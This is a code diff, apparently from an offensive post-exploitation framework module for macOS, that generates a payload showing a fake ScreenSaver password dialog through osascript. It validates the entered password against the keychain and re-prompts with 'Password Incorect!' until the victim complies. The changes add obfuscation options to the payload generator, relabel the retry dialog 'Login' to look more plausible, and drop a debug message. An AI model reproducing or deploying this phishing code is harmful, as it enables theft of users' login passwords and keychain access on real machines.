@@ -81,7 +81,7 @@ class Module:
                 if option in self.options:
                     self.options[option]['Value'] = value
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
 
         exitCount = self.options['ExitCount']['Value']
         verbose = self.options['Verbose']['Value']
@@ -119,7 +119,7 @@ def unlockchain(password):
     else:
         return False
 def retrypassword():
-    process = subprocess.Popen("""osascript -e  'tell app "ScreenSaverEngine" to activate' -e 'tell app "ScreenSaverEngine" to display dialog "ScreenSaver requires your password to continue. Password Incorect!" & return  default answer "" with icon 1 with hidden answer with title "ScreenSaver Alert"'""", stdout=subprocess.PIPE, shell=True)
+    process = subprocess.Popen("""osascript -e  'tell app "ScreenSaverEngine" to activate' -e 'tell app "ScreenSaverEngine" to display dialog "Password Incorect!" & return  default answer "" with icon 1 with hidden answer with title "Login"'""", stdout=subprocess.PIPE, shell=True)
     text = process.communicate()
     return text[0]
 
@@ -135,7 +135,6 @@ def parse(text):
 
 def run(exitCount, verbose=False):
     try:
-        print "Executing..."
         process = subprocess.Popen("""osascript -e  'tell app "ScreenSaverEngine" to activate' -e 'tell app "ScreenSaverEngine" to display dialog "ScreenSaver requires your password to continue." & return  default answer "" with icon 1 with hidden answer with title "ScreenSaver Alert"'""", stdout=subprocess.PIPE, shell=True)
         text = process.communicate()
         text = text[0]
